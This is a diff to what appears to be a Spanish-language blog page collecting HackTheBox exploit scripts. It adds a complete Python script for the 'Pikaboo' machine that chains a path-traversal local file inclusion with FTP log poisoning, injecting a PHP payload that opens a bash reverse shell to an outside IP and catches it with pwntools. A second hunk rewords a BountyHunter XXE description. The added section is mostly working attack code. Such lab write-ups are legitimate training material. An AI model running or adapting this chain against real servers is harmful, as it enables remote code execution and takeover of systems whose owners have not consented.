@@ -4,9 +4,56 @@ layout: content
 
 <p> </p>
 
+<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px;">Pikaboo - HackTheBox</h2>
+
+Este *Script* se aprovecha de un `Local File Inclusion` para derivarlo a la envenenacion de los logs de `FTP` y por ello ganar un Shell inverson inyectando codigo malicioso en los campos `user` y `password`.
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+import requests
+from ftplib import FTP
+import ftplib
+
+# Variables globales
+
+main_url = "http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log"
+payload = """<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"'); ?>"""
+lport = 443
+
+def def_handler(sig,frame):
+    print("Saliendo...")
+    sys.exit(1)
+signal.signal(signal.SIGINT, def_handler)
+
+def makeRequest():
+
+    p1 = log.progress("Payload")
+    p1.status("Inyectando [*]")
+
+    try:
+        ftp = FTP("10.10.10.249")
+        ftp.login(payload,payload)
+    except ftplib.error_perm as error:
+        p1.success("Inyectado [✔]")
+
+    r = requests.get(main_url)
+
+if __name__ == '__main__':
+
+    try:
+        threading.Thread(target=makeRequest, args=()).start()
+    except Exception as e:
+        log.error(str(e))
+
+    shell = listen(lport, timeout=20).wait_for_connection()
+    shell.interactive()
+```
+
 <h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px;">BountyHunter - HackTheBox</h2>
 
-Este *Script* explota un `XXE` codificado en `base64` para poder visualizar `db.php`, este archivo contiene credenciales en texto plano, estas sirven para acceder por `SSH` haciendo uso del usuario `development`.
+Este *Script* explota un `XML enternal entity` codificado en `base64` para poder visualizar `db.php`, este archivo contiene credenciales en texto plano, estas sirven para acceder por `SSH` haciendo uso del usuario `development`.
 
 ```python
 #!/usr/bin/python3
